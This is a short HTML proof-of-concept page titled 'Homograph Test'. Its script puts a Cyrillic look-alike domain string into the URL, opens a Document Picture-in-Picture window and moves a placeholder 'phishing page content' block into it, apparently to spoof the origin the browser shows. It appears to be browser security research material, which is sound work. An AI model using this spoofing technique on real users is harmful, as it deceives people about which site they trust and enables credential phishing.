<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Homograph Test</title>
</head>
<body>

<button id="button">Open PIP</button>

<div id="content" style="display: none;">
    phishing page content here
</div>

<script>
    const button = document.getElementById('button');
    const content = document.getElementById('content');

    const pipOpen = async () => {
        const homographString = '\u0430\u0440\u0440\u0431\u0435.com';
        history.replaceState(null, '', '?target=' + encodeURIComponent(homographString));

        const pipWindow = await documentPictureInPicture.requestWindow({
            width: 330,
            height: 317
        });

        setTimeout(() => {
            history.replaceState(null, '', '/');
        }, 1000);

        content.style.display = 'block';
        pipWindow.document.body.append(content);
    };

    button.onclick = pipOpen;
</script>

</body>
</html>
